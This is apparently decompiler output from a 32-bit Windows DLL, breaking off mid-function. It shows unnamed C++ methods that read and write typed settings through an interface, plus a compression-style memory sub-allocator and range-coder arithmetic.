int __thiscall sub_10034B9D(void *this, int a2)
{
  int v3; // eax
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  int v6; // [esp+14h] [ebp-10h]

  v6 = 0;
  sub_10008683();
  v3 = sub_1001D162((_DWORD *)dword_100BBCF8);
  (*(void (__thiscall **)(int, int, int, int, char *))(*(_DWORD *)v3 + 28))(v3, a2, (int)this + 4, (int)this + 12, v5);
  return a2;
}
// 100BBCF8: using guessed type int dword_100BBCF8;
// 10034B9D: using guessed type char var_14[4];

//----- (10034BEB) --------------------------------------------------------
int __thiscall sub_10034BEB(void *this)
{
  int v2; // eax
  int v3; // esi
  int (__thiscall **v4)(void *, char); // edx
  int *v5; // ecx
  _DWORD v7[5]; // [esp+10h] [ebp-28h] BYREF
  int (__thiscall **pExceptionObject)(void *, char); // [esp+24h] [ebp-14h] BYREF
  int v9[3]; // [esp+28h] [ebp-10h] BYREF
  int v10; // [esp+34h] [ebp-4h]

  sub_10008683();
  v2 = sub_1001D162((_DWORD *)dword_100BBCF8);
  (*(void (__thiscall **)(int, _DWORD *, int, int, int *))(*(_DWORD *)v2 + 28))(
    v2,
    v7,
    (int)this + 4,
    (int)this + 12,
    v9);
  v10 = 0;
  if ( v9[0] != 4 )
  {
    sub_10037745(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVFqpgtZkqrTzylfxafQpgtzkqrt_qsbdzsml_sr__);
  }
  pExceptionObject = off_10095064;
  LOBYTE(v10) = 1;
  v3 = *(_DWORD *)sub_10016C24(v7);
  pExceptionObject = v4;
  v10 = -1;
  sub_10016B53(v5);
  return v3;
}
// 10034C5B: variable 'v4' is possibly undefined
// 10034C62: variable 'v5' is possibly undefined
// 10095064: using guessed type int (__thiscall *off_10095064[4])(void *Block, char);
// 100BBCF8: using guessed type int dword_100BBCF8;
// 10034BEB: using guessed type int var_10[3];
// 10034BEB: using guessed type _DWORD var_28[5];

//----- (10034CBF) --------------------------------------------------------
_DWORD *__thiscall sub_10034CBF(void *this, _DWORD *a2)
{
  int v3; // eax
  int v5[5]; // [esp+10h] [ebp-2Ch] BYREF
  int v6; // [esp+24h] [ebp-18h]
  int (__thiscall **pExceptionObject)(void *, char); // [esp+28h] [ebp-14h] BYREF
  int v8[3]; // [esp+2Ch] [ebp-10h] BYREF
  int v9; // [esp+38h] [ebp-4h]

  v6 = 0;
  sub_10008683();
  v3 = sub_1001D162((_DWORD *)dword_100BBCF8);
  (*(void (__thiscall **)(int, int *, int, int, int *))(*(_DWORD *)v3 + 28))(v3, v5, (int)this + 4, (int)this + 12, v8);
  v9 = 1;
  if ( v8[0] != 1 )
  {
    sub_10037745(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVFqpgtZkqrTzylfxafQpgtzkqrt_qsbdzsml_sr__);
  }
  pExceptionObject = off_10095068;
  LOBYTE(v9) = 2;
  sub_10035135(v5, a2);
  v6 = 1;
  pExceptionObject = off_10095068;
  LOBYTE(v9) = 0;
  sub_10016B53(v5);
  return a2;
}
// 10095068: using guessed type int (__thiscall *off_10095068[3])(void *Block, char);
// 100BBCF8: using guessed type int dword_100BBCF8;
// 10034CBF: using guessed type int var_10[3];
// 10034CBF: using guessed type int var_2C[5];

//----- (10034D51) --------------------------------------------------------
_DWORD *__thiscall sub_10034D51(void *this, _DWORD *a2)
{
  int v3; // eax
  int v5[5]; // [esp+10h] [ebp-2Ch] BYREF
  int v6; // [esp+24h] [ebp-18h]
  int (__thiscall **pExceptionObject)(void *, char); // [esp+28h] [ebp-14h] BYREF
  int v8[3]; // [esp+2Ch] [ebp-10h] BYREF
  int v9; // [esp+38h] [ebp-4h]

  v6 = 0;
  sub_10008683();
  v3 = sub_1001D162((_DWORD *)dword_100BBCF8);
  (*(void (__thiscall **)(int, int *, int, int, int *))(*(_DWORD *)v3 + 28))(v3, v5, (int)this + 4, (int)this + 12, v8);
  v9 = 1;
  if ( v8[0] != 7 )
  {
    sub_10037745(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVFqpgtZkqrTzylfxafQpgtzkqrt_qsbdzsml_sr__);
  }
  pExceptionObject = off_1009506C;
  LOBYTE(v9) = 2;
  sub_10035213(v5, a2);
  v6 = 1;
  pExceptionObject = off_1009506C;
  LOBYTE(v9) = 0;
  sub_10016B53(v5);
  return a2;
}
// 1009506C: using guessed type int (__thiscall *off_1009506C[2])(void *Block, char);
// 100BBCF8: using guessed type int dword_100BBCF8;
// 10034D51: using guessed type int var_10[3];
// 10034D51: using guessed type int var_2C[5];

//----- (10034DE4) --------------------------------------------------------
_DWORD *__thiscall sub_10034DE4(void *this, _DWORD *a2)
{
  int v3; // eax
  int v5[5]; // [esp+10h] [ebp-2Ch] BYREF
  int v6; // [esp+24h] [ebp-18h]
  int (__thiscall **pExceptionObject)(void *, char); // [esp+28h] [ebp-14h] BYREF
  int v8[3]; // [esp+2Ch] [ebp-10h] BYREF
  int v9; // [esp+38h] [ebp-4h]

  v6 = 0;
  sub_10008683();
  v3 = sub_1001D162((_DWORD *)dword_100BBCF8);
  (*(void (__thiscall **)(int, int *, int, int, int *))(*(_DWORD *)v3 + 28))(v3, v5, (int)this + 4, (int)this + 12, v8);
  v9 = 1;
  if ( v8[0] != 2 )
  {
    sub_10037745(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVFqpgtZkqrTzylfxafQpgtzkqrt_qsbdzsml_sr__);
  }
  pExceptionObject = off_10095068;
  LOBYTE(v9) = 2;
  sub_10035135(v5, a2);
  v6 = 1;
  pExceptionObject = off_10095068;
  LOBYTE(v9) = 0;
  sub_10016B53(v5);
  return a2;
}
// 10095068: using guessed type int (__thiscall *off_10095068[3])(void *Block, char);
// 100BBCF8: using guessed type int dword_100BBCF8;
// 10034DE4: using guessed type int var_10[3];
// 10034DE4: using guessed type int var_2C[5];

//----- (10034EA8) --------------------------------------------------------
LONG __thiscall sub_10034EA8(void *this, int a2)
{
  int v3; // edi
  int v4; // eax
  int v6[8]; // [esp+10h] [ebp-24h] BYREF
  int v7; // [esp+30h] [ebp-4h]

  v6[5] = (int)off_10095064;
  v7 = 0;
  sub_10008683();
  v3 = sub_1001D162((_DWORD *)dword_100BBCF8);
  v4 = sub_100350CE((int)v6, a2);
  LOBYTE(v7) = 1;
  (*(void (__thiscall **)(int, int, int, int, int))(*(_DWORD *)v3 + 32))(v3, (int)this + 4, (int)this + 12, v4, 4);
  LOBYTE(v7) = 0;
  return sub_10016B53(v6);
}
// 10095064: using guessed type int (__thiscall *off_10095064[4])(void *Block, char);
// 100BBCF8: using guessed type int dword_100BBCF8;

//----- (10034F11) --------------------------------------------------------
LONG __thiscall sub_10034F11(void *this, int a2)
{
  int v3; // edi
  int v4; // eax
  int v6[8]; // [esp+10h] [ebp-24h] BYREF
  int v7; // [esp+30h] [ebp-4h]

  v6[5] = (int)off_10095068;
  v7 = 0;
  sub_10008683();
  v3 = sub_1001D162((_DWORD *)dword_100BBCF8);
  v4 = sub_100351A1((int)v6, a2);
  LOBYTE(v7) = 1;
  (*(void (__thiscall **)(int, int, int, int, int))(*(_DWORD *)v3 + 32))(v3, (int)this + 4, (int)this + 12, v4, 1);
  LOBYTE(v7) = 0;
  return sub_10016B53(v6);
}
// 10095068: using guessed type int (__thiscall *off_10095068[3])(void *Block, char);
// 100BBCF8: using guessed type int dword_100BBCF8;

//----- (10034F7A) --------------------------------------------------------
LONG __thiscall sub_10034F7A(void *this, int a2)
{
  int v3; // edi
  int v4; // eax
  int v6[8]; // [esp+10h] [ebp-24h] BYREF
  int v7; // [esp+30h] [ebp-4h]

  v6[5] = (int)off_10095068;
  v7 = 0;
  sub_10008683();
  v3 = sub_1001D162((_DWORD *)dword_100BBCF8);
  v4 = sub_100351A1((int)v6, a2);
  LOBYTE(v7) = 1;
  (*(void (__thiscall **)(int, int, int, int, int))(*(_DWORD *)v3 + 32))(v3, (int)this + 4, (int)this + 12, v4, 2);
  LOBYTE(v7) = 0;
  return sub_10016B53(v6);
}
// 10095068: using guessed type int (__thiscall *off_10095068[3])(void *Block, char);
// 100BBCF8: using guessed type int dword_100BBCF8;

//----- (10034FE3) --------------------------------------------------------
LONG __thiscall sub_10034FE3(void *this, int a2)
{
  int v3; // eax
  int v5[6]; // [esp+10h] [ebp-28h] BYREF
  int v6; // [esp+28h] [ebp-10h]
  int v7; // [esp+34h] [ebp-4h]

  v5[5] = (int)off_1009506C;
  v7 = 0;
  sub_10008683();
  v6 = sub_1001D162((_DWORD *)dword_100BBCF8);
  v3 = sub_1003535C(a2, (int)v5);
  LOBYTE(v7) = 1;
  (*(void (__thiscall **)(int, int, int, int, int))(*(_DWORD *)v6 + 32))(v6, (int)this + 4, (int)this + 12, v3, 7);
  LOBYTE(v7) = 0;
  return sub_10016B53(v5);
}
// 1009506C: using guessed type int (__thiscall *off_1009506C[2])(void *Block, char);
// 100BBCF8: using guessed type int dword_100BBCF8;

//----- (1003504E) --------------------------------------------------------
int __thiscall sub_1003504E(void *this)
{
  int v2; // eax
  int v4[5]; // [esp+10h] [ebp-24h] BYREF
  int v5[4]; // [esp+24h] [ebp-10h] BYREF

  sub_10008683();
  v2 = sub_1001D162((_DWORD *)dword_100BBCF8);
  (*(void (__thiscall **)(int, int *, int, int, int *))(*(_DWORD *)v2 + 28))(v2, v4, (int)this + 4, (int)this + 12, v5);
  v5[3] = -1;
  sub_10016B53(v4);
  return v5[0];
}
// 100BBCF8: using guessed type int dword_100BBCF8;
// 1003504E: using guessed type int var_24[5];

//----- (1003509F) --------------------------------------------------------
_DWORD *__thiscall sub_1003509F(_DWORD *Block, char a2)
{
  *Block = off_10095064;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10095064: using guessed type int (__thiscall *off_10095064[4])(void *Block, char);

//----- (100350CE) --------------------------------------------------------
int __stdcall sub_100350CE(int a1, int a2)
{
  sub_10016983((void *)4, a1, &a2);
  return a1;
}

//----- (1003510E) --------------------------------------------------------
_DWORD *__thiscall sub_1003510E(_DWORD *Block, char a2)
{
  *Block = off_10095068;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10095068: using guessed type int (__thiscall *off_10095068[3])(void *Block, char);

//----- (10035135) --------------------------------------------------------
_DWORD *__thiscall sub_10035135(_DWORD *this, _DWORD *a2)
{
  _DWORD *v2; // ecx
  wchar_t *v3; // eax
  int v5[2]; // [esp+10h] [ebp-18h] BYREF
  int v6; // [esp+18h] [ebp-10h]
  int v7; // [esp+24h] [ebp-4h]

  v6 = 0;
  if ( sub_10016C24(this) )
  {
    v3 = (wchar_t *)sub_10016C24(v2);
    sub_1000CC20(v5, v3);
    v7 = 1;
    sub_1000CE26(a2, (int)v5);
    v6 = 1;
    LOBYTE(v7) = 0;
    sub_1000CE59(v5);
  }
  else
  {
    sub_1000CC20(a2, word_100B6A60);
    v7 = 0;
    v6 = 1;
  }
  return a2;
}
// 10035169: variable 'v2' is possibly undefined
// 100B6A60: using guessed type wchar_t word_100B6A60[2];

//----- (100351A1) --------------------------------------------------------
int __stdcall sub_100351A1(int a1, int a2)
{
  size_t v2; // eax
  void *v4; // [esp-4h] [ebp-24h]

  v4 = *(void **)(*(_DWORD *)(a2 + 4) + 12);
  v2 = sub_1000D0EE(a2);
  sub_10016983((void *)(2 * v2 + 2), a1, v4);
  return a1;
}

//----- (100351EC) --------------------------------------------------------
_DWORD *__thiscall sub_100351EC(_DWORD *Block, char a2)
{
  *Block = off_1009506C;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 1009506C: using guessed type int (__thiscall *off_1009506C[2])(void *Block, char);

//----- (10035213) --------------------------------------------------------
_DWORD *__thiscall sub_10035213(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  bool v4; // bl
  size_t v5; // eax
  int v7[5]; // [esp+10h] [ebp-4Ch] BYREF
  int v8[4]; // [esp+24h] [ebp-38h] BYREF
  int v9[2]; // [esp+34h] [ebp-28h] BYREF
  int v10[2]; // [esp+3Ch] [ebp-20h] BYREF
  unsigned int pExceptionObject; // [esp+44h] [ebp-18h] BYREF
  int v12; // [esp+48h] [ebp-14h]
  char v13; // [esp+4Fh] [ebp-Dh]
  int v14; // [esp+58h] [ebp-4h]

  v12 = 0;
  sub_10019C82(v8);
  v14 = 1;
  if ( sub_10016C24(this) )
  {
    pExceptionObject = 0;
    v13 = 0;
    do
    {
      v3 = (_DWORD *)sub_10016DFF(this[3] - pExceptionObject, this, (int)v7, pExceptionObject);
      LOBYTE(v14) = 2;
      sub_1000CCE5(v3, v10);
      LOBYTE(v14) = 4;
      sub_10016B53(v7);
      v4 = 1;
      if ( sub_1000D0EE((int)v10) )
      {
        sub_1000CC20(v9, word_100B6A64);
        LOBYTE(v14) = 5;
        v12 |= 2u;
        if ( sub_1000D0B5((int)v9, (int)v10) )
          v4 = 0;
      }
      v14 = 4;
      if ( (v12 & 2) != 0 )
      {
        v12 &= ~2u;
        sub_1000CE59(v9);
      }
      if ( v4 )
      {
        v13 = 1;
      }
      else
      {
        sub_10002DD6(v8, (int)v10);
        v5 = sub_1000D0EE((int)v10);
        pExceptionObject += 2 * v5 + 2;
        if ( pExceptionObject >= this[3] )
        {
          sub_100376F3(&pExceptionObject);
          _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVInuqrrgqIzqrxemfn_qsbdzsml_sr__);
        }
      }
      LOBYTE(v14) = 1;
      sub_1000CE59(v10);
    }
    while ( !v13 );
    sub_10002C48(v8, a2);
    v12 |= 1u;
    LOBYTE(v14) = 0;
  }
  else
  {
    sub_10002C48(v8, a2);
    v12 = 1;
    LOBYTE(v14) = 0;
  }
  sub_10002CF0(v8);
  return a2;
}
// 100B6A64: using guessed type wchar_t word_100B6A64[4];
// 10035213: using guessed type int var_38[4];
// 10035213: using guessed type int var_4C[5];

//----- (1003535C) --------------------------------------------------------
int __userpurge sub_1003535C@<eax>(int a1@<edi>, int a2)
{
  char *i; // esi
  int v3; // eax
  int v4; // eax
  size_t v5; // eax
  _DWORD *v6; // eax
  int v8[5]; // [esp+10h] [ebp-38h] BYREF
  int v9[8]; // [esp+24h] [ebp-24h] BYREF
  int v10; // [esp+44h] [ebp-4h]

  sub_10016983(0, a2, 0);
  v10 = 0;
  v9[5] = 1;
  sub_10016983((void *)2, (int)v9, 0);
  v10 = 1;
  sub_10016EE4(v9, 0);
  for ( i = 0; (unsigned int)i < (*(int (__thiscall **)(int))(*(_DWORD *)a1 + 4))(a1); ++i )
  {
    v3 = (*(int (__thiscall **)(int))(*(_DWORD *)a1 + 48))(a1);
    v4 = (*(int (__thiscall **)(int, char *, _DWORD))(*(_DWORD *)a1 + 48))(a1, i, *(_DWORD *)(*(_DWORD *)(v3 + 4) + 12));
    v5 = sub_1000D0EE(v4);
    v6 = (_DWORD *)sub_10016983((void *)(2 * v5 + 2), (int)v8, i);
    LOBYTE(v10) = 2;
    sub_10016CD5(v6, a2);
    LOBYTE(v10) = 1;
    sub_10016B53(v8);
  }
  sub_10016CD5(v9, a2);
  LOBYTE(v10) = 0;
  sub_10016B53(v9);
  return a2;
}
// 1003535C: using guessed type int var_38[5];

//----- (10035420) --------------------------------------------------------
_DWORD *__stdcall sub_10035420(_DWORD *a1, int a2, int a3, int a4)
{
  *a1 = &off_10094BA0;
  sub_1000CE26(a1 + 1, (int)&a3);
  a1[3] = a2;
  sub_1000CE59(&a3);
  return a1;
}
// 10094BA0: using guessed type int (__thiscall *off_10094BA0)(void *Block, char);

//----- (10035466) --------------------------------------------------------
_DWORD *__stdcall sub_10035466(_DWORD *a1, int a2)
{
  *a1 = &off_10094BA0;
  sub_1000CC20(a1 + 1, &word_100B6A50);
  a1[3] = a2;
  return a1;
}
// 10094BA0: using guessed type int (__thiscall *off_10094BA0)(void *Block, char);
// 100B6A50: using guessed type wchar_t word_100B6A50;

//----- (100354A1) --------------------------------------------------------
_DWORD *__stdcall sub_100354A1(int a1, _DWORD *a2)
{
  sub_1000CE26(a2, a1 + 4);
  return a2;
}

//----- (100354D6) --------------------------------------------------------
LONG __thiscall sub_100354D6(int *this, int a2, int a3)
{
  sub_10002C25(&a3, this + 2);
  return sub_1000CE59(&a2);
}

//----- (1003551D) --------------------------------------------------------
_DWORD *__stdcall sub_1003551D(_DWORD *a1, int a2)
{
  __int32 v2; // eax

  v2 = sub_10022348((int)a1, a2, 0);
  *a1 = &off_10095078;
  sub_10015CC3(v2, (int)(a1 + 4));
  return a1;
}
// 10095078: using guessed type int (__thiscall *off_10095078)(void *Block, char);

//----- (10035557) --------------------------------------------------------
_BYTE *__thiscall sub_10035557(_BYTE *Block, char a2)
{
  sub_10035576(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10035576) --------------------------------------------------------
int __thiscall sub_10035576(_BYTE *this)
{
  *(_DWORD *)this = &off_10095078;
  sub_100223E2(this);
  return sub_100223A0(this);
}
// 10095078: using guessed type int (__thiscall *off_10095078)(void *Block, char);

//----- (100355B8) --------------------------------------------------------
int __thiscall sub_100355B8(void *this, int a2)
{
  int v3; // eax

  v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3 + 16))(v3, a2);
  return sub_10015D26((int)this + 16, a2);
}

//----- (100355DD) --------------------------------------------------------
int __thiscall sub_100355DD(void *this, _DWORD *a2)
{
  int v3; // eax

  v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  (*(void (__thiscall **)(int, _DWORD *))(*(_DWORD *)v3 + 12))(v3, a2);
  return sub_10015CDE(a2, (int)this + 16);
}

//----- (10035602) --------------------------------------------------------
int __thiscall sub_10035602(_DWORD *this)
{
  return this[6];
}

//----- (10035606) --------------------------------------------------------
char sub_10035606()
{
  return 0;
}

//----- (10035609) --------------------------------------------------------
_DWORD *__stdcall sub_10035609(_DWORD *a1, int a2)
{
  __int32 v2; // eax

  v2 = sub_1002F2CA((int)a1, a2, 0);
  *a1 = &off_100950AC;
  sub_10015CC3(v2, (int)(a1 + 4));
  return a1;
}
// 100950AC: using guessed type int (__thiscall *off_100950AC)(void *Block, char);

//----- (10035643) --------------------------------------------------------
_BYTE *__thiscall sub_10035643(_BYTE *Block, char a2)
{
  sub_10035662(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10035662) --------------------------------------------------------
void __thiscall sub_10035662(_BYTE *this)
{
  *(_DWORD *)this = &off_100950AC;
  sub_1002F370(this);
  sub_1002F322(this);
}
// 100950AC: using guessed type int (__thiscall *off_100950AC)(void *Block, char);

//----- (100356A4) --------------------------------------------------------
int __thiscall sub_100356A4(void *this, char *a2)
{
  int v3; // eax
  int v4; // ebx

  v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  v4 = (*(int (__thiscall **)(int, char *))(*(_DWORD *)v3 + 16))(v3, a2);
  if ( v4 == 1 )
    sub_10015D26((int)this + 16, *a2);
  return v4;
}

//----- (100356D6) --------------------------------------------------------
int __thiscall sub_100356D6(void *this, int *a2)
{
  int v3; // eax
  int v4; // ebx
  _DWORD *v5; // eax
  int v7[7]; // [esp+10h] [ebp-20h] BYREF
  int v8; // [esp+2Ch] [ebp-4h]

  v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  v4 = (*(int (__thiscall **)(int, int *))(*(_DWORD *)v3 + 12))(v3, a2);
  if ( v4 )
  {
    v5 = (_DWORD *)sub_10016E32(v4, a2, (int)v7, 0);
    v8 = 0;
    sub_10015CDE(v5, (int)this + 16);
    v8 = -1;
    sub_10016B53(v7);
  }
  return v4;
}
// 100356D6: using guessed type int var_20[7];

//----- (10035729) --------------------------------------------------------
int __thiscall sub_10035729(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 24))(v1);
}

//----- (10035735) --------------------------------------------------------
int __thiscall sub_10035735(_DWORD *this)
{
  return this[6];
}

//----- (10035739) --------------------------------------------------------
char sub_10035739()
{
  return 0;
}

//----- (1003573C) --------------------------------------------------------
int __fastcall sub_1003573C(_DWORD *a1)
{
  int v1; // eax
  _DWORD *v3; // [esp-2h] [ebp-4h] BYREF

  v3 = a1;
  v1 = *a1;
  HIBYTE(v3) = 0;
  if ( (*(int (__thiscall **)(_DWORD *, char *, _DWORD *))(v1 + 16))(a1, (char *)&v3 + 3, v3) )
    return HIBYTE(v3);
  else
    return -1;
}

//----- (1003575C) --------------------------------------------------------
int __thiscall sub_1003575C(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[8] + 16))(this + 8, a2);
  return a2;
}

//----- (10035780) --------------------------------------------------------
unsigned int sub_10035780()
{
  unsigned int result; // eax

  result = dword_100BD3DC / (unsigned int)dword_100BD3EC;
  unk_100BEFAC += dword_100BD3E4 * (dword_100BD3DC / (unsigned int)dword_100BD3EC);
  dword_100BD3DC = dword_100BD3DC / (unsigned int)dword_100BD3EC * (dword_100BD3E8 - dword_100BD3E4);
  return result;
}
// 100BD3DC: using guessed type int dword_100BD3DC;
// 100BD3E4: using guessed type int dword_100BD3E4;
// 100BD3E8: using guessed type int dword_100BD3E8;
// 100BD3EC: using guessed type int dword_100BD3EC;

//----- (100357B0) --------------------------------------------------------
unsigned int sub_100357B0()
{
  unsigned int result; // eax

  result = (unsigned int)dword_100BD3DC >> 14;
  unk_100BEFAC += dword_100BD3E4 * ((unsigned int)dword_100BD3DC >> 14);
  dword_100BD3DC = ((unsigned int)dword_100BD3DC >> 14) * (dword_100BD3E8 - dword_100BD3E4);
  return result;
}
// 100BD3DC: using guessed type int dword_100BD3DC;
// 100BD3E4: using guessed type int dword_100BD3E4;
// 100BD3E8: using guessed type int dword_100BD3E8;

//----- (100357DB) --------------------------------------------------------
unsigned int sub_100357DB()
{
  dword_100BD3DC /= (unsigned int)dword_100BD3EC;
  return (dword_100BD3F0 - unk_100BEFAC) / (unsigned int)dword_100BD3DC;
}
// 100BD3DC: using guessed type int dword_100BD3DC;
// 100BD3EC: using guessed type int dword_100BD3EC;
// 100BD3F0: using guessed type int dword_100BD3F0;

//----- (10035800) --------------------------------------------------------
unsigned int sub_10035800()
{
  dword_100BD3DC = (unsigned int)dword_100BD3DC >> 14;
  return (dword_100BD3F0 - unk_100BEFAC) / (unsigned int)dword_100BD3DC;
}
// 100BD3DC: using guessed type int dword_100BD3DC;
// 100BD3F0: using guessed type int dword_100BD3F0;

//----- (1003581B) --------------------------------------------------------
int sub_1003581B()
{
  int result; // eax

  result = dword_100BD3E4;
  unk_100BEFAC += dword_100BD3DC * dword_100BD3E4;
  dword_100BD3DC *= dword_100BD3E8 - dword_100BD3E4;
  return result;
}
// 100BD3DC: using guessed type int dword_100BD3DC;
// 100BD3E4: using guessed type int dword_100BD3E4;
// 100BD3E8: using guessed type int dword_100BD3E8;

//----- (10035876) --------------------------------------------------------
int *sub_10035876()
{
  int *result; // eax
  int i; // ecx

  result = &dword_100BF810;
  for ( i = 37; i >= 0; --i )
  {
    *result = 0;
    result[1] = 0;
    result += 2;
  }
  return result;
}
// 100BF810: using guessed type int dword_100BF810;

//----- (100358B9) --------------------------------------------------------
_DWORD *__usercall sub_100358B9@<eax>(int a1@<eax>, int a2@<ecx>, int a3)
{
  int v3; // eax
  int v4; // ecx
  int v5; // edx
  _DWORD *result; // eax
  int v7; // esi
  int *v8; // edx
  int *v9; // edx

  v3 = (unsigned __int8)byte_100BEFB0[a1];
  v4 = (unsigned __int8)byte_100BEFB0[a2] - v3;
  v5 = (unsigned __int8)byte_100BEFDF[v4];
  result = (_DWORD *)(a3 + 12 * v3);
  if ( (unsigned __int8)byte_100BEFB0[v5] != v4 )
  {
    v7 = (unsigned __int8)byte_100BEFAF[v5];
    v8 = &dword_100BF810[2 * v5 - 2];
    result[1] = v8[1];
    v8[1] = (int)result;
    *result = -1;
    result[2] = v7;
    ++*v8;
    result += 3 * v7;
    v4 -= v7;
  }
  v9 = &dword_100BF810[2 * (unsigned __int8)byte_100BEFDF[v4]];
  result[1] = v9[1];
  v9[1] = (int)result;
  *result = -1;
  result[2] = v4;
  ++*v9;
  return result;
}
// 100BF810: using guessed type int dword_100BF810[];

//----- (10035932) --------------------------------------------------------
int sub_10035932()
{
  int result; // eax
  unsigned int i; // ecx

  result = dword_100B6A4C + dword_100BE190 + dword_100BD3F4 - dword_100BEFA8 - dword_100BD404;
  for ( i = 0; i < 0x26; ++i )
    result += -12 * dword_100BF810[2 * i] * (unsigned __int8)byte_100BEFB0[i];
  return result;
}
// 100B6A4C: using guessed type int dword_100B6A4C;
// 100BD3F4: using guessed type int dword_100BD3F4;
// 100BD404: using guessed type int dword_100BD404;
// 100BE190: using guessed type int dword_100BE190;
// 100BEFA8: using guessed type int dword_100BEFA8;
// 100BF810: using guessed type int dword_100BF810[];

//----- (1003596C) --------------------------------------------------------
void sub_1003596C()
{
  if ( dword_100B6A4C )
  {
    dword_100B6A4C = 0;
    j__free(Block);
  }
}
// 100B6A4C: using guessed type int dword_100B6A4C;

//----- (10035989) --------------------------------------------------------
int __usercall sub_10035989@<eax>(size_t a1@<esi>)
{
  int result; // eax

  sub_1003596C();
  result = (int)operator new(a1);
  Block = (void *)result;
  if ( result )
  {
    dword_100B6A4C = a1;
    return 1;
  }
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 100B6A4C: using guessed type int dword_100B6A4C;

//----- (100359A9) --------------------------------------------------------
unsigned int sub_100359A9()
{
  unsigned int result; // eax

  memset(dword_100BF810, 0, 0x130u);
  dword_100BD3F4 = (int)Block;
  dword_100BD400 = 0;
  dword_100BD404 = (int)Block + dword_100B6A4C;
  result = 84 * (((unsigned int)dword_100B6A4C >> 3) / 0xC);
  dword_100BEFA8 = (int)Block + dword_100B6A4C - result;
  dword_100BE190 = (int)Block + dword_100B6A4C - result;
  return result;
}
// 100B6A4C: using guessed type int dword_100B6A4C;
// 100BD3F4: using guessed type int dword_100BD3F4;
// 100BD400: using guessed type int dword_100BD400;
// 100BD404: using guessed type int dword_100BD404;
// 100BE190: using guessed type int dword_100BE190;
// 100BEFA8: using guessed type int dword_100BEFA8;
// 100BF810: using guessed type int dword_100BF810[];

//----- (100359FB) --------------------------------------------------------
unsigned int sub_100359FB()
{
  unsigned int result; // eax
  int *v1; // esi
  int *v2; // edx
  int v3; // ecx
  int v4; // ecx
  _DWORD *v5; // ecx
  _DWORD *v6; // ecx
  unsigned int v7; // esi
  int v8; // edi
  int v9; // edx
  int v10; // esi
  int v11; // eax
  _DWORD *v12; // edx
  _DWORD *v13; // eax
  int v14; // esi
  int v15; // [esp+Ch] [ebp-10h] BYREF
  _DWORD *v16; // [esp+10h] [ebp-Ch]
  int v17; // [esp+14h] [ebp-8h]
  int v18; // [esp+18h] [ebp-4h]

  result = dword_100BE190;
  v15 = 0;
  v17 = 0;
  if ( dword_100BE190 != dword_100BD404 )
    *(_BYTE *)dword_100BE190 = 0;
  v1 = &v15;
  v16 = 0;
  v2 = &dword_100BF814;
  v18 = 38;
  do
  {
    while ( *v2 )
    {
      result = *v2;
      v3 = *(_DWORD *)(*v2 + 4);
      --*(v2 - 1);
      *v2 = v3;
      v4 = *(_DWORD *)(result + 8);
      if ( v4 )
      {
        while ( 1 )
        {
          v5 = (_DWORD *)(result + 12 * v4);
          if ( *v5 != -1 )
            break;
          *(_DWORD *)(result + 8) += v5[2];
          v5[2] = 0;
          v4 = *(_DWORD *)(result + 8);
        }
        *(_DWORD *)(result + 4) = v1[1];
        v1[1] = result;
        v1 = (int *)result;
      }
    }
    v2 += 2;
    --v18;
  }
  while ( v18 );
  while ( v16 )
  {
    v6 = v16;
    v16 = (_DWORD *)v16[1];
    result = v6[2];
    if ( result )
    {
      if ( result > 0x80 )
      {
        v7 = ((result - 129) >> 7) + 1;
        do
        {
          v6[1] = dword_100BF93C;
          dword_100BF93C = (int)v6;
          *v6 = -1;
          v6[2] = 128;
          ++dword_100BF938;
          result -= 128;
          v6 += 384;
          --v7;
        }
        while ( v7 );
      }
      v8 = (unsigned __int8)byte_100BEFDF[result];
      if ( (unsigned __int8)byte_100BEFB0[v8] != result )
      {
        v9 = (unsigned __int8)byte_100BEFAF[v8--];
        v10 = result - v9;
        v11 = 3 * v9;
        v12 = (_DWORD *)((char *)&unk_100BF808 + 8 * v10);
        v13 = &v6[v11];
        v13[1] = v12[1];
        v12[1] = v13;
        *v13 = -1;
        v13[2] = v10;
        ++*v12;
      }
      v14 = (unsigned __int8)byte_100BEFB0[v8];
      result = (unsigned int)&dword_100BF810[2 * v8];
      v6[1] = *(_DWORD *)(result + 4);
      *(_DWORD *)(result + 4) = v6;
      *v6 = -1;
      v6[2] = v14;
      ++*(_DWORD *)result;
    }
  }
  dword_100BD400 = 0x2000;
  return result;
}
// 100BD400: using guessed type int dword_100BD400;
// 100BD404: using guessed type int dword_100BD404;
// 100BE190: using guessed type int dword_100BE190;
// 100BF810: using guessed type int dword_100BF810[];
// 100BF814: using guessed type int dword_100BF814;
// 100BF938: using guessed type int dword_100BF938;
// 100BF93C: using guessed type int dword_100BF93C;

//----- (10035B40) --------------------------------------------------------
int __usercall sub_10035B40@<eax>(int a1@<edi>)
{
  int v1; // ebx
  int v2; // eax
  int *v3; // ecx
  int result; // eax
  int v5; // edx
  int *v6; // eax
  int v7; // esi
  int v8; // ecx
  int v9; // eax

  v1 = a1;
  if ( dword_100BD400 || (sub_100359FB(), v2 = 2 * a1, !dword_100BF814[2 * a1]) )
  {
